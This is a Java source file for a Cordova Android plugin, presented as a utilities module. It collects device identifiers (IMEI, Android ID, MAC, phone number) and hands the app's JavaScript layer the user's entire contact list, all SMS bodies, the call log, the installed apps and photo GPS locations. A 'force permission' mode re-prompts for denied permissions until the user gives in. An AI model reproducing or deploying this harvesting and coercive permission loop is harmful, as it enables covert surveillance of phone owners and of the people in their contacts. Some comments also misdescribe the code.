package com.cordova.plugin.utils;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.ExifInterface;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.apache.cordova.CallbackContext;
import org.apache.cordova.CordovaArgs;
import org.apache.cordova.CordovaPlugin;
import org.apache.cordova.PermissionHelper;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.UUID;


public class pluginUtils extends CordovaPlugin {
    public CallbackContext m_permission_Callback = null;
    public boolean m_forcePermission = false;   ////强行获取所有权限，不给就不继续

    public void requestPermissions(String[] permissions, boolean forceGet, CallbackContext callback_ctx) {
        m_forcePermission = forceGet;
        m_permission_Callback = callback_ctx;
        PermissionHelper.requestPermissions(this, 23534, permissions);
    }

    public void onRequestPermissionResult(int requestCode, String[] permissions, int[] grantResults) throws JSONException {
        if (requestCode == 23534) {
            for (int k = 0; k < grantResults.length; k++) {
                int r = grantResults[k];
                if (r == PackageManager.PERMISSION_DENIED) {
                    ////被拒绝
                    if (m_forcePermission) {
                        //强行申请直到同意
                        PermissionHelper.requestPermission(this, 23534, permissions[k]);
                    } else {
                        //反馈告知申请失败
                        this.m_permission_Callback.error(permissions[k]);
                        return;
                    }
                } else {
                    //申请成功
                    this.m_permission_Callback.success(permissions[k]);
                }
            }
        }
    }

    public boolean checkPermission(String permission) {
        return PermissionHelper.hasPermission(this, permission);
    }

    public static int getVersionCode(Context context) {
        PackageManager pm = context.getPackageManager();//包管理器
        try {
            PackageInfo packageInfo = pm.getPackageInfo(context.getPackageName(), PackageManager.GET_CONFIGURATIONS);
            return packageInfo.versionCode;
        } catch (Exception e) {
            e.printStackTrace();
            return -1;
        }
    }

    public static String getVersionName(Context context) {
        PackageManager pm = context.getPackageManager();//包管理器
        try {
            PackageInfo packageInfo = pm.getPackageInfo(context.getPackageName(), PackageManager.GET_CONFIGURATIONS);
            return packageInfo.versionName;
        } catch (Exception e) {
            e.printStackTrace();
            return "0.0.1";
        }
    }

    public static String getMetaDataByKey(Context context, String key) {
        if (context == null) {
            return null;
        }
        try {
            ApplicationInfo appInfo = null;
            appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA);
            String msg = appInfo.metaData.getString(key);
            return msg;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 通过WiFiManager获取mac地址
     * @param context
     * @return
     */
    private static String tryGetWifiMac(Context context) {
        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        WifiInfo wi = wm.getConnectionInfo();
        if (wi == null || wi.getMacAddress() == null) {
            return null;
        }
        if ("02:00:00:00:00:00".equals(wi.getMacAddress().trim())) {
            return null;
        } else {
            return wi.getMacAddress().trim();
        }
    }

    //获取当前手机网络的ip地址
    public static String getIPv4_mobile() {
        String ipv4="";
        try {
            ArrayList<NetworkInterface> nilist = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface ni : nilist) {
                ArrayList<InetAddress> ialist = Collections.list(ni.getInetAddresses());
                for (InetAddress address : ialist) {
                    if (!address.isLoopbackAddress() && address instanceof Inet4Address) {
                        ipv4 = address.getHostAddress();
                        Log.i("", "getIPv4_mobile ipv4="+ipv4);
//                        return ipv4;
                    }
                }

            }
        } catch (SocketException ex) {
            Log.e("getLocalIpAddress ex=", ex.toString());
        }
        return ipv4;
    }

    public static String intToIp(int ipInt) {
        StringBuilder sb = new StringBuilder();
        sb.append(ipInt & 0xFF).append(".");
        sb.append((ipInt >> 8) & 0xFF).append(".");
        sb.append((ipInt >> 16) & 0xFF).append(".");
        sb.append((ipInt >> 24) & 0xFF);
        return sb.toString();
    }

    //仅仅获取wifi的ip地址
    public static String getIP_Wifi(Activity activity) {
        String ip = "";
        ConnectivityManager conMann = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiNetworkInfo = conMann.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiNetworkInfo.isConnected()) {
            WifiManager wifiManager = (WifiManager) activity.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            int ipAddress = wifiInfo.getIpAddress();
            ip = intToIp(ipAddress);//获取wifi的ip地址
        }
        return ip;
    }

    public static boolean getIsWifi(Activity activity) {
        Boolean iswifi = false;
        ConnectivityManager conMann = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo wifiNetworkInfo = conMann.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiNetworkInfo.isConnected()) {
            iswifi = true;
        }
        return iswifi;
    }

    //获取当前ip----优先wifi的ip地址，然后是手机网络的ip地址
    public static String getIpAddress(Activity activity) {
        String ip = "";
        ConnectivityManager conMann = (ConnectivityManager) activity.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mobileNetworkInfo = conMann.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
        NetworkInfo wifiNetworkInfo = conMann.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        if (wifiNetworkInfo.isConnected()) {
            WifiManager wifiManager = (WifiManager) activity.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            int ipAddress = wifiInfo.getIpAddress();
            ip = intToIp(ipAddress);//获取wifi的ip地址
        } else if (mobileNetworkInfo.isConnected()) {
            ip = getIPv4_mobile();////本地ipv4地址，依据移动网络
        }
        return ip;
    }

    ////MEID(Mobile Equipment Identifier)移动设备识别码，是CDMA手机的身份识别码，也是每台CDMA手机或通讯平板唯一的识别码，由14位数字组成。
    private static String getPhoneMEID(Activity activity, int slotIndex) {
        String meid = "";
        Log.i("pluginUtils", "getPhoneMEID slotIndex="+slotIndex);
        try {
            TelephonyManager tm = (TelephonyManager) activity.getSystemService(Service.TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                //androidQ以后，无法获取MEID
                return "";
            }else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {  //O = 26 = android 8.0
                meid = tm.getMeid(slotIndex);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        if (meid == null) meid = "";
        return meid;
    }


    /**
     * 获取设备唯一标识
     */
    public static String getUUID() {
        String serial = "serial";
        String m_szDevIDShort = "35" +
                Build.BOARD.length() % 10 + Build.BRAND.length() % 10 +
                Build.CPU_ABI.length() % 10 + Build.DEVICE.length() % 10 +
                Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 +
                Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 +
                Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 +
                Build.TAGS.length() % 10 + Build.TYPE.length() % 10 +
                Build.USER.length() % 10; //13 位
        //使用硬件信息拼凑出来的15位号码
        return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
    }

    ////IMEI(International Mobile Equipment Identity)是国际移动设备身份码的缩写，由15位数字组成的电子串号与每台手机一一对应，且该码全世界唯一。
    //slotIndex卡插槽id，早期版本传入会忽略这个id
    public static String getIMEI(Activity activity, int slotIndex) {
        String imei = null;
        Log.i("pluginUtils", "getIMEI slotIndex="+slotIndex);
        try {
            TelephonyManager tm = (TelephonyManager) activity.getSystemService(Service.TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.P) {               //Q = 29 = anderoid 10.0  //P= 28 = android 9.0
                //androidQ以后，无法获取IMEI       //只能用硬件信息的UUID来代替IMEI
                return getUUID();
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {        //O = 26 = android 8.0
                //8.0及之后版本
                imei = tm.getImei(slotIndex);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {         //M = 23 = android 6.0
                imei = tm.getDeviceId(slotIndex);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {   //LOLLIPOP = 21 = android 5.0
                //5.0及以后版本通过反射来获取imei号码
                //ObsoleteSdkInt---判断中的sdkint比最小sdk还低，可以忽略这个警告
                if (slotIndex > 0) return "";
                Method method = tm.getClass().getMethod("getImei");
                imei = (String) method.invoke(tm);
            } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP){
                //更早的版本
                if (slotIndex > 0) return "";
                imei = tm.getDeviceId();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (imei == null) imei = "";
        return imei;
    }

    //获取androidId
    public static String getAndroidID(Activity activity){
        String androidID = Settings.System.getString(activity.getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
        return androidID;
    }

    ////获取手机号码
    public static String getPhoneNum(Activity activity, int slotIndex) {
        String phoneNum = "";
        try {
            Context ctx = activity.getApplicationContext();
            TelephonyManager tm = (TelephonyManager) activity.getSystemService(Service.TELEPHONY_SERVICE);
//            Log.i("pluginUtils", "getPhoneNum READ_SMS="+ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS));
//            Log.i("pluginUtils", "getPhoneNum READ_PHONE_NUMBERS="+ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_NUMBERS));
//            Log.i("pluginUtils", "getPhoneNum READ_PHONE_STATE="+ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE));
            if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                phoneNum = tm.getLine1Number();
                Log.i("pluginUtils", "getPhoneNum phoneNum="+phoneNum);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return phoneNum;
    }

    public static String getSerial(Activity activity){
        String ser = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O
            && android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.P) {
            if (ActivityCompat.checkSelfPermission(activity.getApplicationContext(), Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                ser = Build.getSerial();
            }
        }
        return ser;
    }

    public static String getDeviceInfoJson(Activity activity){
        //内存相关
        ActivityManager manager = (ActivityManager) activity.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        manager.getMemoryInfo(memoryInfo);

        //存储信息
        final StatFs statFs = new StatFs(Environment.getDataDirectory().getPath());
        long totalCounts = statFs.getBlockCountLong();//总共的block数
        long availableCounts = statFs.getAvailableBlocksLong() ; //获取可用的block数
        long size = statFs.getBlockSizeLong(); //每格所占的大小，一般是4KB==
        long availROMSize = availableCounts * size;//可用内部存储大小
        long totalROMSize = totalCounts *size; //内部存储总大小

        //显示信息
        DisplayMetrics displayMetrics = activity.getResources().getDisplayMetrics();

        //wifi的mac地址
        String wifi_mac = tryGetWifiMac(activity.getApplicationContext());
        //当前ip地址，默认是wifi的，没有wifi时是手机网络的
        String ip = getIpAddress(activity);

        JSONObject obj = new JSONObject();
        try {
            obj.put("device_version", Build.VERSION.RELEASE);   //手机系统版本号
            obj.put("sdkVersion", Build.VERSION.SDK_INT);       //手机sdk版本号
            obj.put("device_brand", Build.BRAND);               //设备厂商--Huawei Xiaomi等
            obj.put("device_manufacturer", Build.MANUFACTURER); //设备工厂名称（愿意是留给代工厂）实际上都是厂商，和brand基本一样
            obj.put("device_product", Build.PRODUCT);           //产品名称， 整体产品的名称：The name of the overall product.
            obj.put("device_model", Build.MODEL);               //产品名称， 终端产品的最终用户可见名称：The end-user-visible name for the end product.
            obj.put("device_fingerprint", Build.FINGERPRINT);   //设备指纹
            obj.put("device_display", Build.DISPLAY);           //设备显示名称
            obj.put("device_host", Build.HOST);                 //作用未知
            obj.put("device_user", Build.USER);                 //使用者，没有什么用
            obj.put("productionDate", Build.TIME);              //出厂日期（如果刷机了，就是系统安装日期）
            obj.put("androidId", getAndroidID(activity));      //获取AndroidId
            obj.put("phoneNum", getPhoneNum(activity, 0)); //获取手机号----大概率拿不到
            obj.put("device_DEVICE", Build.DEVICE);             //设备名称
            obj.put("device_TYPE", Build.TYPE);                 //Build.TYPE返回结果：user表示用户版，有限的访问权限，适合product环境;adb默认是关闭的。userdebug，和user类似，具有root和debug权限;eng 表示工程师版， 可调试;adb默认是打开的
            obj.put("device_TAGS", Build.TAGS);
            obj.put("device_Serial", getSerial(activity));
            obj.put("device_hardware", Build.HARDWARE);         //硬件名称，cpu硬件，例如麒麟970=kirin970
            obj.put("device_id", Build.ID);                     //设备ID名，"HUAWEICOL-AL10"
            obj.put("device_baseOS", Build.VERSION.BASE_OS);    //基本操作系统The base OS build the product is based on.

            obj.put("mac", wifi_mac);                           //获取mac地址
            obj.put("ip", ip);                                  //当前ip地址
            obj.put("isWifi", getIsWifi(activity));             //当前是否为wifi连接
//            obj.put("ip_wifi", getIP_Wifi(activity));           //当前wifi的ip地址
//            obj.put("ip_mobile", getIPv4_mobile());             //当前手机网络的ip地址

            //imei
            obj.put("imei", getIMEI(activity,0));       //卡槽1
//            obj.put("imei1", getIMEI(activity,1));      //卡槽2
            //meid
//            obj.put("meid", getPhoneMEID(activity, 0));   //卡槽1
//            obj.put("meid1", getPhoneMEID(activity, 1));  //卡槽2

            obj.put("deviceWidth", displayMetrics.widthPixels);           //设备宽
            obj.put("deviceHeight", displayMetrics.heightPixels);         //设备高

            obj.put("ramCanUse",  memoryInfo.availMem);         //可用内存
            obj.put("ramTotal",  memoryInfo.totalMem);          //总内存
            obj.put("romCanUse",  availROMSize);         //可用存储
            obj.put("romTotal",  totalROMSize);          //总存储
        } catch (JSONException e) {
            e.printStackTrace();
        }

        String ret = obj.toString();
        return ret;
    }
    /////---------------------------------------------------------------------------
    //获取联系人列表
    //index 为第几页，一次只返回100个，多的在下一页，避免信息过长，导致String放不下
    public static String getAllContacts_JSONStr(Activity activity, int index){
        JSONArray arr = getAllContacts(activity, index);
        String json_str = arr.toString();
        return json_str;
    }
    public static JSONArray getAllContacts(Activity activity, int index) {
        JSONArray json_arr = new JSONArray();
        try {
            Cursor cursor = activity.getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            while (cursor.moveToNext()) {
                JSONObject json_obj = new JSONObject();
                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                json_obj.put("name", name);
                //通过contactId找电话
                int phoneid = 0;
                Cursor phoneCursor = activity.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId, null, null);
                while (phoneCursor.moveToNext()) {
                    String phone = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (null != phone) {
                        phone = phone.replace("-", "");
                        phone = phone.replace(" ", "");
                        if (phone != "") {
                            if (phoneid == 0) {
                                json_obj.put("phone", phone);
                            }else{
                                json_obj.put("phone_"+phoneid, phone);
                            }
                            phoneid++;
                        }
                    }
                }
                //获取联系人备注信息
                int noteid = 0;
                Cursor noteCursor = activity.getContentResolver().query(
                        ContactsContract.Data.CONTENT_URI,
                        new String[]{ContactsContract.Data._ID, ContactsContract.CommonDataKinds.Nickname.NAME},
                        ContactsContract.Data.CONTACT_ID + "=?" + " AND " + ContactsContract.Data.MIMETYPE + "='"
                                + ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE + "'",
                        new String[]{contactId}, null);
                if (noteCursor.moveToFirst()) {
                    do {
                        String note = noteCursor.getString(noteCursor
                                .getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME));
                        if (note != "") {
                            if (noteid == 0) {
                                json_obj.put("note", note);
                            }else{
                                json_obj.put("note_"+noteid, note);
                            }
                            noteid++;
                        }
                    } while (noteCursor.moveToNext());
                }
                json_arr.put(json_obj);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return json_arr;
    }
    ////----------------------------------------------------------------------
    //获取App列表
    //index 为第几页，一次只返回100个，多的在下一页，避免信息过长，导致String放不下
    public static String getAppInstallList_JSONstr(Activity activity, int index) {
        JSONArray arr = getAppInstallList(activity, index);
        String json_str = arr.toString();
        return json_str;
    }
    public static JSONArray getAppInstallList(Activity activity, int index){
        JSONArray json_arr = new JSONArray();
        try {
            List<PackageInfo> packageInfos = activity.getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < packageInfos.size(); i++) {
                PackageInfo packageInfo = packageInfos.get(i);
                JSONObject json_obj = new JSONObject();
                json_obj.put("appName", packageInfo.applicationInfo.name);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    json_obj.put("appVersionCode", packageInfo.getLongVersionCode());
                }
                json_obj.put("appVersionName", packageInfo.versionName);
                json_obj.put("appPackageName", packageInfo.packageName);
                json_obj.put("installTime", packageInfo.firstInstallTime);
                json_obj.put("updateTime", packageInfo.lastUpdateTime);
                json_arr.put(json_obj);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return json_arr;
    }

    private static Uri SMS_INBOX = Uri.parse("content://sms/");
    private static String getALLSMS_JSONStr(Activity activity, int index){
        JSONArray arr = getAllSMS(activity, index);
        String json_str = arr.toString();
        return json_str;
    }
    private static JSONArray getAllSMS(Activity activity, int index) {
        JSONArray json_arr = new JSONArray();
        try {
            ContentResolver cr = activity.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
            Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
            if (null == cur) {
                Log.i("ooc", "getAllSMS cur == null");
                return json_arr;
            }
            while (cur.moveToNext()) {
                JSONObject json_obj = new JSONObject();
                String phone = cur.getString(cur.getColumnIndex("address"));//手机号
                String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
                String msg = cur.getString(cur.getColumnIndex("body"));//短信内容
                String _type = cur.getString(cur.getColumnIndex("type"));//短信类型
                String time = cur.getString(cur.getColumnIndex("date"));//短信时间
                //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
                json_obj.put("phone", phone);
                json_obj.put("name", name);
                json_obj.put("msg", msg);
                json_obj.put("type", _type);
                json_obj.put("time", time);
                json_arr.put(json_obj);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return json_arr;
    }

    public static String getAllPhotoInfos_JSONStr(Activity activity, int index){
        JSONArray arr = getAllPhotoInfos(activity, index);
        String json_str = arr.toString();
        return json_str;
    }
    public static JSONArray getAllPhotoInfos(Activity activity, int index)
    {
        JSONArray json_arr = new JSONArray();
        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        try {
            ContentResolver contentResolver = activity.getContentResolver();
            Cursor cursor = contentResolver.query(uri, null, null, null, null);
            if (cursor == null || cursor.getCount() <= 0) return null; // 没有图片
            while (cursor.moveToNext()) {
                JSONObject json_obj = new JSONObject();
                int _idx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                String path = cursor.getString(_idx); // 文件地址
                String fileName = path.substring(path.lastIndexOf("/")+1);
                ExifInterface exif = new ExifInterface(path);
                String date = exif.getAttribute(ExifInterface.TAG_DATETIME_ORIGINAL);//获得拍摄时间
                String model = exif.getAttribute(ExifInterface.TAG_MODEL);//获得拍摄机器
                String width = exif.getAttribute(ExifInterface.TAG_IMAGE_WIDTH);//宽度
                String height = exif.getAttribute(ExifInterface.TAG_IMAGE_LENGTH);//高度
                String lat = exif.getAttribute(ExifInterface.TAG_GPS_LATITUDE);//高度
                String lon = exif.getAttribute(ExifInterface.TAG_GPS_LONGITUDE);//高度

                json_obj.put("name", fileName);
                json_obj.put("path", path);
                json_obj.put("date", date);
                json_obj.put("model", model);
                json_obj.put("width", width);
                json_obj.put("height", height);
                json_obj.put("lat", lat);
                json_obj.put("lon", lon);

                json_arr.put(json_obj);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return json_arr;
    }

    private static Uri callUri = CallLog.Calls.CONTENT_URI;
    private static String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
            , CallLog.Calls.NUMBER// 通话记录的电话号码
            , CallLog.Calls.DATE// 通话记录的日期
            , CallLog.Calls.DURATION// 通话时长
            , CallLog.Calls.TYPE};// 通话类型}
    public static String getCallLog_JSONStr(Activity activity, int index){
        JSONArray arr = getCallLog(activity, index);
        String json_str = arr.toString();
        return json_str;
    }
    public static JSONArray getCallLog(Activity activity, int index) {
        JSONArray json_arr = new JSONArray();
        try {
            Cursor cursor = activity.getContentResolver().query(callUri, // 查询通话记录的URI
                    columns, null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
            );
            while (cursor.moveToNext()) {
                JSONObject json_obj = new JSONObject();
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));  //姓名
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));  //号码
                long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)); //获取通话日期
                String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(dateLong));
                //String time = new SimpleDateFormat("HH:mm").format(new Date(dateLong));
                int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));//获取通话时长，值为多少秒
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)); //获取通话类型：1.呼入2.呼出3.未接
//                String dayCurrent = new SimpleDateFormat("dd").format(new Date());
//                String dayRecord = new SimpleDateFormat("dd").format(new Date(dateLong));

                json_obj.put("name", name);
                json_obj.put("phone", number);
                json_obj.put("date", date);
                json_obj.put("duration", duration);
                json_obj.put("type", type);

                json_arr.put(json_obj);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return json_arr;
    }

    @Override
    public boolean execute(String action, CordovaArgs args, CallbackContext callbackContext) throws JSONException {
        Activity activity = this.cordova.getActivity();
        Context context = this.cordova.getContext();

        if ("getVersionCode".equals(action)){
            ////获取版本code
            int vcode = getVersionCode(context);
            callbackContext.success(vcode);
            return true;
        }else if ("getVersionName".equals(action)){
            ////获取版本名称
            String vname = getVersionName(context);
            callbackContext.success(vname);
        	return true;
        }else if ("getMetaDataByKey".equals(action)){
            String key = args.getString(0);
            String vData = getMetaDataByKey(context, key);
            callbackContext.success(vData);
            return true;
        }else if ("requestPermissions".equals(action)){
            JSONArray json_per = args.getJSONArray(0);
            boolean forceget = args.getBoolean(1);
            ArrayList<String> stringList = new ArrayList<String>();
            for (int i =0; i< json_per.length(); i++){
                stringList.add(json_per.getString(i));
            }
            String[] perStr = (String[])stringList.toArray(new String[stringList.size()]) ;
            requestPermissions(perStr, forceget, callbackContext);
            return true;
        }else if ("checkPermission".equals(action)){
            String key = args.getString(0);
            boolean has = checkPermission(key);
            callbackContext.success(has?1:0);
            return true;
        }else if ("getDeviceInfoJson".equals((action))){
            String ret = getDeviceInfoJson(activity);
            callbackContext.success(ret);
            return true;
        }else if ("getAllContacts_JSONStr".equals(action)
                || "getAllContacts".equals(action)){
            int index = args.getInt(0);
            String ret = getAllContacts_JSONStr(activity, index);
            callbackContext.success(ret);
            return true;
        }else if ("getAppInstallList_JSONstr".equals(action)
                || "getAppInstallList".equals(action)){
            int index = args.getInt(0);
            String ret = getAppInstallList_JSONstr(activity, index);
            callbackContext.success(ret);
            return true;
        }else if ("getALLSMS_JSONStr".equals(action)
                || "getALLSMS".equals(action)){
            int index = args.getInt(0);
            String ret = getALLSMS_JSONStr(activity, index);
            callbackContext.success(ret);
            return true;
        }else if ("getAllPhotoInfos_JSONStr".equals(action)
                || "getAllPhotoInfos".equals(action)){
            int index = args.getInt(0);
            String ret = getAllPhotoInfos_JSONStr(activity, index);
            callbackContext.success(ret);
            return true;
        }else if ("getCallLog_JSONStr".equals(action)
                || "getCallLog".equals(action)){
            int index = args.getInt(0);
            String ret = getCallLog_JSONStr(activity, index);
            callbackContext.success(ret);
            return true;
        }

        callbackContext.error(action + " is not a supported action");
        return false;
    }
}
